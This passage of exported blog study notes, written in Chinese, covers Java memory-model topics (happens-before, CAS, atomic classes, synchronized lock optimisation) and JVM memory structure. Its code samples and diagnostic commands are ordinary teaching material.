<li>7：将引用地址复制给 INSTANCE  变量</li>
</ul>
<p>其中 <strong>第 4</strong> 和 <strong>第 7</strong> 的顺序是不固定的，在多线程下，可能会按照如下顺序执行：</p>
<p><img src="/images/java/JMM/有序性_2.png" alt></p>
<p>这样的话，t1 尚未完全执行构造方法，如果构造方法中需要执行很多初始化操作，那么 t2 线程拿到的是一个未完全初始化的单例。</p>
<p><strong>解决有序性</strong>： 对 INSTANCE 使用 volatile 修饰。</p>
<p><strong>总结</strong>： volatile 可以禁止指令重排。</p>
<h3 id="4、happens-before-规则"><a href="#4、happens-before-规则" class="headerlink" title="4、happens-before 规则"></a>4、happens-before 规则</h3><blockquote>
<p>这是总结，可以不看，理解上面的三节基本就懂了。</p>
</blockquote>
<p><strong>happens-before</strong> 规定了哪些写操作对其他线程的读操作可见，它是可见性和有序性的一套规则总结。</p>
<ul>
<li><p>线程解锁 m 之前，对变量的赋值，对于接下来“对 m 加锁”的“其他线程”对“该变量”可见</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">static</span> Object m = <span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(m)&#123;</span><br><span class="line">        x = <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="string">"t1"</span>).start();</span><br><span class="line">    </span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(m)&#123;</span><br><span class="line">        System.out.println(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="string">"t2"</span>).start();</span><br></pre></td></tr></table></figure>
</li>
<li><p>线程对volatile变量的赋值，对接来其他线程对该变量可见</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="keyword">static</span> <span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    x = <span class="number">10</span>;</span><br><span class="line">&#125;,<span class="string">"t1"</span>).start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(x);</span><br><span class="line">&#125;,<span class="string">"t2"</span>).start();</span><br></pre></td></tr></table></figure>
</li>
<li><p>线程 start 前对变量的赋值，对该线程开始后对改变的可见</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x;</span><br><span class="line"></span><br><span class="line">x = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(x);</span><br><span class="line">&#125;,<span class="string">"t2"</span>).start();</span><br></pre></td></tr></table></figure>
</li>
<li><p>线程结束前对变量的赋值，对其他线程得知它结束后读可见（比如其他线程调用 t1.isAlive() 或者 t1.join()等待它结束）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x;</span><br><span class="line"></span><br><span class="line">Thread t1 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">   x= <span class="number">10</span>;</span><br><span class="line">&#125;,<span class="string">"t1"</span>);</span><br><span class="line">t1.start();</span><br><span class="line"></span><br><span class="line">t1.join();</span><br><span class="line">System.out.println(x);</span><br></pre></td></tr></table></figure>
</li>
<li><p>线程 t1 打断 t2 ( interrupt ) 前对变量的赋值，对于其他线程得知 t2 被打断后对便利的读可见（通过 t2.interrupted 或者 t2.isInterrupted）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo5</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> x;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Thread t2 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(Thread.currentThread().isInterrupted())&#123;</span><br><span class="line">                    System.out.println(x);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">"t2"</span>);</span><br><span class="line">        t2.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">// 打断前赋值  </span></span><br><span class="line">            x = <span class="number">10</span>;</span><br><span class="line">            t2.interrupt();</span><br><span class="line">        &#125;,<span class="string">"t1"</span>);</span><br><span class="line">        t2.start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!t2.isInterrupted())&#123;</span><br><span class="line">            Thread.yield();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>对变量默认值（0，false，null）的赋值，对其他线程时可见的</p>
</li>
<li><p>具有传递性，如果 x hb(happens-before) -&gt; y 并且 y hb -&gt; z 那么有 x hb -&gt; z</p>
</li>
</ul>
<h3 id="5、CAS与原子类"><a href="#5、CAS与原子类" class="headerlink" title="5、CAS与原子类"></a>5、CAS与原子类</h3><h4 id="5-1-CAS"><a href="#5-1-CAS" class="headerlink" title="5.1 CAS"></a>5.1 CAS</h4><p>CAS （Compare and Swap），它体现的一种乐观锁的思想（无锁并发），比如多线程对一个共享Int变量做加1操作：</p>
<blockquote>
<p>synchronized 是悲观锁思想</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//死循环，不断尝试</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> 旧值 = 共享变量; <span class="comment">//假如取到的值是0</span></span><br><span class="line">    <span class="keyword">int</span> 结果 = 旧值 + <span class="number">1</span>;<span class="comment">// 0 + 1 = 1</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     1. 执行到这里，如果其他线程修改 “共享变量”值为5，则本线程的计算结果作废,compareAndSwap会返回false；重新进入循环尝试。</span></span><br><span class="line"><span class="comment">     2. 直到compareAndSwap返回true时，表示本线程做修改的同时，其他线程没有做任何修改（干扰）</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>( compareAndSwap(旧值,结果))&#123;</span><br><span class="line">        <span class="comment">//成功，退出循环</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取“共享变量”时，为了保证它的可见性，需要用 volatile 修饰。</p>
<p>结合CAS 和 volatile 可以实现无锁并发，适用于竞争不激烈、多核CPU（死循环的原因）场景下。</p>
<ul>
<li>因为没有使用 synchronized，线程不会阻塞，这是效果提升的因素之一</li>
<li>如果竞争激烈，可以想到重试必然频繁发送，反而效率会受到影响</li>
</ul>
<blockquote>
<p> CAS 底层依赖一个 Unsafe 类来直接调用操作系统底层的 CAS 指令</p>
</blockquote>
<h4 id="5-2-原子操作类"><a href="#5-2-原子操作类" class="headerlink" title="5.2 原子操作类"></a>5.2 原子操作类</h4><p><code>java.util.concurrent</code> 中提供了原子操作类，可以提供线程安全的操作.</p>
<p>例如：AtomicInteger、AtomicBoolean等，它们底层就是采用CAS + volatile实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AtomicDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AtomicInteger i = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5000</span>; j++) &#123;</span><br><span class="line">                i.getAndIncrement();    <span class="comment">//获取并自增 i++</span></span><br><span class="line">                <span class="comment">// i.incrementAndGet(); //自增并获取 ++i</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Thread t2 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5000</span>; j++) &#123;</span><br><span class="line">                i.getAndDecrement(); <span class="comment">//获取并自减 i--</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line"></span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line"></span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6、synchronized-优化"><a href="#6、synchronized-优化" class="headerlink" title="6、synchronized 优化"></a>6、synchronized 优化</h3><p>Java HotSpot 虚拟机中，每个对象都有对象头（class 指针、Mark Word）。Mark Word 平时存储这个对象的hash码、分代年龄，当加锁时，这些信息就根据情况被替换为标记位、线程锁记录指针、重量级锁指针、线程ID等。</p>
<p>synchronized本身是一个重量级的操作，但JDK一直为synchronized做优化，比如轻量级锁等。</p>
<h4 id="6-1-轻量级锁"><a href="#6-1-轻量级锁" class="headerlink" title="6.1 轻量级锁"></a>6.1 轻量级锁</h4><p><img src="/images/java/JMM/轻量级锁_1.png" alt></p>
<p>每个线程栈帧都会包含一个锁记录的结构，内部可以存储锁定对象的 Mark Word</p>
<p>以下分析上面代码块轻量级锁加锁的过程（多个线程访问时间错开）</p>
<p><img src="/images/java/JMM/轻量级锁_2.png" alt></p>
<p><img src="/images/java/JMM/轻量级锁_3.png" alt></p>
<h4 id="6-2-锁膨胀"><a href="#6-2-锁膨胀" class="headerlink" title="6.2 锁膨胀"></a>6.2 锁膨胀</h4><p>如果在尝试加轻量级锁的过程中CAS操作失败，有一种情况是有其他线程为对象加上轻量级锁（有竞争），这时需要进行锁膨胀，将轻量级锁升级为重量级锁。</p>
<p>看示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> Object obj = <span class="keyword">new</span> Object();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(obj)&#123;</span><br><span class="line">        <span class="comment">//同步代码块</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析：</p>
<p><img src="/images/java/JMM/锁膨胀_1.png" alt></p>
<p><img src="/images/java/JMM/锁膨胀_2.png" alt></p>
<h4 id="6-3-重量级锁"><a href="#6-3-重量级锁" class="headerlink" title="6.3 重量级锁"></a>6.3 重量级锁</h4><blockquote>
<p>自旋：先不进入阻塞，尝试重试</p>
</blockquote>
<p><img src="/images/java/JMM/重量级锁.png" alt></p>
<p>重量级锁自旋优化</p>
<p><img src="/images/java/JMM/重量级锁-自旋成功.png" alt></p>
<p><img src="/images/java/JMM/重量级锁-自旋失败.png" alt></p>
<h4 id="6-4-偏向锁"><a href="#6-4-偏向锁" class="headerlink" title="6.4 偏向锁"></a>6.4 偏向锁</h4><blockquote>
<p>这个比较复杂，稍微理解就行，课程里面也是带过一下</p>
</blockquote>
<p><img src="/images/java/JMM/偏向锁_1.png" alt></p>
<p><img src="/images/java/JMM/偏向锁_2.png" alt></p>
<h4 id="6-5-其他优化"><a href="#6-5-其他优化" class="headerlink" title="6.5 其他优化"></a>6.5 其他优化</h4><p><img src="/images/java/JMM/synchronized其他优化_1.png" alt></p>
<p><img src="/images/java/JMM/synchronized其他优化_2.png" alt></p>
<p><img src="/images/java/JMM/synchronized其他优化_3.png" alt></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>jmm</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马程序员并发编程</title>
    <url>/Java/%E9%BB%91%E9%A9%AC%E7%A8%8B%E5%BA%8F%E5%91%98%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<p>本文是<a href="https://www.bilibili.com/video/av81461839" target="_blank" rel="noopener"><strong>【黑马程序员并发编程-哔哩哔哩】</strong></a>教学视频学习所做的笔记</p>
<h2 id="一、XXX"><a href="#一、XXX" class="headerlink" title="一、XXX"></a>一、XXX</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3>]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>黑马程序员JVM学习笔记</title>
    <url>/Java/%E9%BB%91%E9%A9%AC%E7%A8%8B%E5%BA%8F%E5%91%98JVM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>本文是<a href="https://b23.tv/AYSxdj" target="_blank" rel="noopener"><strong>【黑马程序员JVM完整教程，全网超高评价，全程干货不拖沓-哔哩哔哩】</strong></a>教学视频学习所做的笔记</p>
<blockquote>
<p>部分笔记内容拷贝自<a href="https://nyimac.gitee.io/2020/07/03/JVM%E5%AD%A6%E4%B9%A0/#1%E3%80%81%E7%A8%8B%E5%BA%8F%E8%AE%A1%E6%95%B0%E5%99%A8" target="_blank" rel="noopener">【JVM学习】</a></p>
</blockquote>
<p><img src="/images/java/jvm/学习路线.png" alt></p>
<h2 id="一、什么是JVM"><a href="#一、什么是JVM" class="headerlink" title="一、什么是JVM"></a>一、什么是JVM</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>Java Virtual Machine，JAVA程序的<strong>运行环境</strong>（JAVA二进制字节码的运行环境）</p>
<h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><ul>
<li>一次编写，到处运行</li>
<li>自动内存管理，垃圾回收机制</li>
<li>数组下标越界检查</li>
</ul>
<h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>JVM JRE JDK的区别</p>
<p><img src="/images/java/jvm/JVM_JRE_JDK的区别.png" alt></p>
<h3 id="常见JVM"><a href="#常见JVM" class="headerlink" title="常见JVM"></a>常见JVM</h3><p><img src="/images/java/jvm/常见JVM.png" alt></p>
<h2 id="二、内存结构"><a href="#二、内存结构" class="headerlink" title="二、内存结构"></a>二、内存结构</h2><p><img src="/images/java/jvm/学习路线.png" alt></p>
<ul>
<li>程序计数器</li>
<li>虚拟机栈</li>
<li>本地方法栈</li>
<li>堆</li>
<li>方法区</li>
</ul>
<h3 id="1、程序计数器"><a href="#1、程序计数器" class="headerlink" title="1、程序计数器"></a>1、程序计数器</h3><p>作用：用于保存JVM中下一条所要执行的指令的地址</p>
<p>特点：</p>
<ul>
<li>线程私有<ul>
<li>CPU会为每个线程分配时间片，当当前线程的时间片使用完以后，CPU就会去执行另一个线程中的代码</li>
<li>程序计数器是<strong>每个线程</strong>所<strong>私有</strong>的，当另一个线程的时间片用完，又返回来执行当前线程的代码时，通过程序计数器可以知道应该执行哪一行指令</li>
</ul>
</li>
<li>不会存在内存溢出</li>
</ul>
<h3 id="2、虚拟机栈"><a href="#2、虚拟机栈" class="headerlink" title="2、虚拟机栈"></a>2、虚拟机栈</h3><p><img src="/images/java/jvm/虚拟机栈.png" alt="虚拟机栈"></p>
<h4 id="2-1-定义"><a href="#2-1-定义" class="headerlink" title="2.1 定义"></a>2.1 定义</h4><p>Java Virtual Machine Stacks (Java虚拟机栈)</p>
<ul>
<li>每个<strong>线程</strong>运行时所需要的内存空间，称为<strong>虚拟机栈</strong></li>
<li>每个栈由多个<strong>栈帧(Frame)</strong>组成，对应着每次调用方法时所占用的内存</li>
<li>每个线程只能有<strong>一个活动栈帧</strong>，对应着<strong>当前正在执行的方法</strong></li>
</ul>
<p><img src="/images/java/jvm/虚拟机栈演示图.png" alt></p>
<p>演示代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		method1();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		method2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">method2</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> c = a + b;</span><br><span class="line">		<span class="keyword">return</span> c;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/java/jvm/虚拟机栈演示DEBUG.jpg" alt></p>
<p><strong>问题辨析：</strong></p>
<ul>
<li>垃圾回收是否涉及栈内存？<ul>
<li><strong>不需要</strong>。因为虚拟机栈中是由一个个栈帧组成的，在方法执行完毕后，对应的栈帧就会被弹出栈。所以无需通过垃圾回收机制去回收内存。</li>
</ul>
</li>
<li>栈内存的分配越大越好吗？<ul>
<li>不是。因为<strong>物理内存是一定的</strong>，栈内存越大，可以支持更多的递归调用，但是可执行的线程数就会越少。</li>
<li><code>-Xss size</code> 指定栈内存大小，一般无需指定，使用默认的即可。</li>
</ul>
</li>
<li>方法内的局部变量是否是线程安全的？<ul>
<li>变量是否线程安全，要看此变量是线程共享的，还是私有的？</li>
<li>如果方法内<strong>局部变量没有逃离方法的作用范围</strong>，则是<strong>线程安全</strong>的</li>
<li>如果如果<strong>局部变量引用了对象</strong>，并<strong>逃离了方法的作用范围</strong>，则需要考虑线程安全问题</li>
<li><img src="/images/java/jvm/线程安全演示.png" alt="线程安全演示"></li>
</ul>
</li>
</ul>
<h4 id="2-2-内存溢出"><a href="#2-2-内存溢出" class="headerlink" title="2.2 内存溢出"></a>2.2 内存溢出</h4><p>栈内存溢出错误： <code>Java.lang.stackOverflowError</code></p>
<p>发生原因：</p>
<ul>
<li>虚拟机栈中，<strong>栈帧过多</strong>（无限递归）</li>
<li>虚拟机栈中，<strong>栈帧过大</strong> (不容易出现)</li>
</ul>
<h4 id="2-3-线程运行诊断"><a href="#2-3-线程运行诊断" class="headerlink" title="2.3 线程运行诊断"></a>2.3 线程运行诊断</h4><p>案例1：CPU占用过多</p>
<ul>
<li><p>演示代码：<code>while(true){...}</code>，<code>nohup</code> 运行</p>
</li>
<li><p><code>top</code> 查看进程 PID 占用情况</p>
</li>
<li><code>ps H -eo pid, tid, %cpu | grep 具体PID</code> 查看某进程(pid)中的线程(tid)占用CPU的详细情况</li>
<li><code>jstack PID</code> 查看进程所有线程的nid (16进制)，tid是10进制值，转换nid或tid比对，可以定位到线程的哪行代码出了问题。</li>
</ul>
<p>案例2：程序运行很久都没有结果</p>
<ul>
<li>演示代码：死锁</li>
<li><code>jstack PID</code> 查看线程运行情况，能看到死锁信息</li>
<li><img src="/images/java/jvm/jstack发现死锁.png" alt></li>
<li><img src="/images/java/jvm/死锁代码.png" alt></li>
</ul>
<h3 id="3、本地方法栈"><a href="#3、本地方法栈" class="headerlink" title="3、本地方法栈"></a>3、本地方法栈</h3><p><img src="/images/java/jvm/本地方法栈.png" alt="本地方法栈"></p>
<p>一些带有 <strong>native</strong> 关键字的方法，Java调用C/C++方法。</p>
<p><strong>本地方法栈</strong> 的作用就是为 <strong>本地方法</strong> 的运行提供内存空间。</p>
<h3 id="4、堆-Heap"><a href="#4、堆-Heap" class="headerlink" title="4、堆(Heap)"></a>4、堆(Heap)</h3><p><img src="/images/java/jvm/堆.png" alt="堆"></p>
<blockquote>
<p>前面1.2.3点的 “栈” 都是线程 “私有” 的区，而 “堆” 和 “方法区” 是线程共享的区。</p>
</blockquote>
<p>定义：通过new关键字创建的对象都会被放在<strong>堆</strong>内存</p>
<p>特点</p>
<ul>
<li>所有线程共享，堆内存中的对象都需要考虑线程安全问题</li>
<li>有垃圾回收机制</li>
</ul>
<h4 id="4-1-堆内存溢出"><a href="#4-1-堆内存溢出" class="headerlink" title="4.1 堆内存溢出"></a>4.1 堆内存溢出</h4><blockquote>
<p>堆内存虽然有垃圾回收，但如果不断产生新的对象，而产生的对象一直有引用，那么无法垃圾回收，堆内存将会耗尽，也就是堆内存溢出。</p>
</blockquote>
<p><code>-Xmx Size</code> 参数指定堆内存大小</p>
<p><img src="/images/java/jvm/堆内存溢出演示代码.png" alt="堆内存溢出演示代码"></p>
<p><img src="/images/java/jvm/堆内存溢出异常.png" alt="堆内存溢出异常"></p>
<h4 id="4-2-堆内存诊断"><a href="#4-2-堆内存诊断" class="headerlink" title="4.2 堆内存诊断"></a>4.2 堆内存诊断</h4><ol>
<li><p><strong>jps</strong> 工具</p>
<p>命令行查看当前系统中Java进程</p>
</li>
<li><p><strong>jmap</strong> 工具</p>
<p>命令行查看某时刻堆内存占用情况</p>
<blockquote>
<p>OracleJDK运行没问题，但OpenJDK可能无法直接运行：</p>
<p>$ jmap -heap 37420<br>Error: -heap option used<br>Cannot connect to core dump or remote debug server. Use jhsdb jmap instead</p>
</blockquote>
<p><img src="/images/java/jvm/堆内存诊断演示代码.png" alt></p>
<p><img src="/images/java/jvm/jmap.png" alt></p>
</li>
<li><p><strong>jconsole</strong> 工具</p>
<p>图形界面多功能监控工具，可以连续监测</p>
<p><img src="/images/java/jvm/jconsole.png" alt></p>
</li>
<li><p><strong>jvisualvm</strong> 工具</p>
<p>图形界面多功能监控工具，可以连续监测，可以对堆内存抓取快照，以下是示例：</p>
<p><img src="/images/java/jvm/jvisualvm_1.png" alt></p>
<p><img src="/images/java/jvm/jvisualvm_2.png" alt></p>
<p><img src="/images/java/jvm/jvisualvm_3.png" alt></p>
<p><img src="/images/java/jvm/jvisualvm_4.png" alt></p>
</li>
</ol>
<h3 id="5、方法区"><a href="#5、方法区" class="headerlink" title="5、方法区"></a>5、方法区</h3><p><img src="/images/java/jvm/方法区.png" alt><br><strong>方法区</strong>的定义摘自<a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html" target="_blank" rel="noopener">【JVM 规范】</a> 翻译 ：</p>
<ul>
<li>Java虚拟机中有一个被所有线程<strong>共享</strong>的<strong>方法区</strong>。它存储着每个类的结构(structures)信息，譬如<strong>运行时的常量池(run-time constant pool)，字段(field)，方法数据(medthod data)，以及方法和构造方法的代码</strong>，包括一些在类和实例初始化和接口初始化时候使用的特殊方法。</li>
<li><strong>方法区</strong>在<strong>JVM启动</strong>时候被创建。虽然方法区在逻辑层面上是堆的一部分(具体由厂商实现，如IBM，Oracle等)，但是就简单实现来说既不会被回收也不会被压缩。这个规范并<strong>不强制指定方法区存放的位置</strong>也不会对编译过的代码有管理策略的限制（oraclejdk 1.8和1.7及之前实现就不一样）。</li>
<li>方法区可能有一个固定的大小或者也可以通过计算大小去扩展也可以在不需要的时候被压缩。</li>
<li>方法区的内存也不需要是连续的。</li>
<li>Jvm虚拟机实现可以提供给编程人员或者用户初始化方法区的大小，同时在方法区可变大小的情况下，控制这个方法区的最大值和最小值。</li>
<li>和方法区有关联的异常情况：如果方法区满足不了构造所需要的内存，JVM就会抛出内存溢出错误：<strong>OutOfMemoryError</strong>。</li>
</ul>
<p><strong>JVM内存结构示意图：</strong><br><img src="/images/java/jvm/方法区组成.png" alt="JVM内存结构"></p>
<h4 id="5-1-内存溢出"><a href="#5-1-内存溢出" class="headerlink" title="5.1 内存溢出"></a>5.1 内存溢出</h4><ul>
<li>1.8以前会导致<strong>永久代(PermGen)</strong>内存溢出<br>参数<code>-XX:MaxPermSize=8m</code> 可以测试导致错误： <code>java.lang.OutOfMemoryError: PermGen space</code></li>
<li>1.8以后会导致<strong>元空间(Metaspace)</strong>内存溢出<br>参数<code>-XX:MaxMetaspaceSize=8m</code> 可以测试导致错误： <code>java.lang.OutOfMemoryError: Metaspace</code></li>
</ul>
<p>加载过多的class会导致内存溢出，实际项目中容易出现该错误的常见场景有：spring 、mybatis等大型框架。</p>
<h4 id="5-2-常量池"><a href="#5-2-常量池" class="headerlink" title="5.2 常量池"></a>5.2 常量池</h4><p>二进制字节码的组成：<strong>类的基本信息、常量池、类的方法定义（包含了虚拟机指令）</strong></p>
<p>常量池就是一张表，虚拟机指令根据这张常量表找到要执行的类名、方法名、参数类型、字面量信息</p>
<h4 id="5-3-运行时常量池"><a href="#5-3-运行时常量池" class="headerlink" title="5.3 运行时常量池"></a>5.3 运行时常量池</h4><p>常量池是在 <code>*.class</code> 文件中的，当该<strong>class类被加载以后</strong>，它的常量池信息就会放入<strong>运行时常量池</strong>，并把里面的<strong>符号地址变为真实内存地址</strong></p>
<h4 id="5-4-串池-StringTable"><a href="#5-4-串池-StringTable" class="headerlink" title="5.4 串池(StringTable)"></a>5.4 串池(StringTable)</h4><p>StringTable是<strong>字符串常量池</strong>（简称串池），其数据结构上是一个 hash 表，字符串对象就充当 hash 表中的 key，key 的不重复性，是 hash 表的基本特性。它是jdk用来解决以new的方式创建字符串对象的一个缺点：堆内存中会存在大量重复的字符串，占用内存。</p>
<h5 id="5-4-1-StringTable的特性："><a href="#5-4-1-StringTable的特性：" class="headerlink" title="5.4.1 StringTable的特性："></a>5.4.1 StringTable的特性：</h5><ul>
<li>常量池中的字符串仅是符号，只有在<strong>被用到时才会转化为对象</strong></li>
<li>利用<strong>串池</strong>的机制，来避免重复创建<strong>字符串对象</strong></li>
<li>字符串<strong>变量</strong>拼接的原理是<strong>StringBuilder</strong></li>
<li>字符串<strong>常量</strong>拼接的原理是<strong>编译器优化</strong></li>
<li>可以使用<strong>String.intern()方法</strong>，主动将串池中还没有的<strong>字符串对象</strong>放入串池中</li>
<li><strong>注意</strong>：无论是<strong>串池</strong>还是<strong>堆</strong>里面的字符串，都是对象</li>
</ul>
<blockquote>
<p>注意：示例运行的环境：</p>
<p>openjdk version “1.8.0_141”<br>OpenJDK Runtime Environment (build 1.8.0_141-8u141-b15-3~14.04-b15)<br>OpenJDK 64-Bit Server VM (build 25.141-b15, mixed mode)</p>
</blockquote>
<h6 id="StringTable示例1："><a href="#StringTable示例1：" class="headerlink" title="StringTable示例1："></a>StringTable示例1：</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringTableStudy</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String a = <span class="string">"a"</span>; </span><br><span class="line">		String b = <span class="string">"b"</span>;</span><br><span class="line">		String ab = <span class="string">"ab"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>javap -v StringTableStudy.class</code>反编译结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">4</span>, args_size=<span class="number">1</span></span><br><span class="line">         0: ldc           #2                  // String a</span><br><span class="line">         <span class="number">2</span>: astore_1</span><br><span class="line">         3: ldc           #3                  // String b</span><br><span class="line">         <span class="number">5</span>: astore_2</span><br><span class="line">         6: ldc           #4                  // String ab</span><br><span class="line">         <span class="number">8</span>: astore_3</span><br><span class="line">         <span class="number">9</span>: <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
<ul>
<li>当执行到 ldc #2 时，会把符号 a 变为 “a” 字符串对象，<strong>并放入串池中</strong></li>
<li>当执行到 ldc #3 时，会把符号 b 变为 “b” 字符串对象，<strong>并放入串池中</strong></li>
<li>当执行到 ldc #4 时，会把符号 ab 变为 “ab” 字符串对象，<strong>并放入串池中</strong></li>
</ul>
<ul>
<li>最终串池 <strong>StringTable [“a”, “b”, “ab”]</strong></li>
</ul>
<p>总结：字符串对象的创建都是<strong>懒惰的</strong>，只有当运行到那一行字符串且在串池中不存在的时候（如 ldc #2）时，该字符串才会被创建并放入串池中。</p>
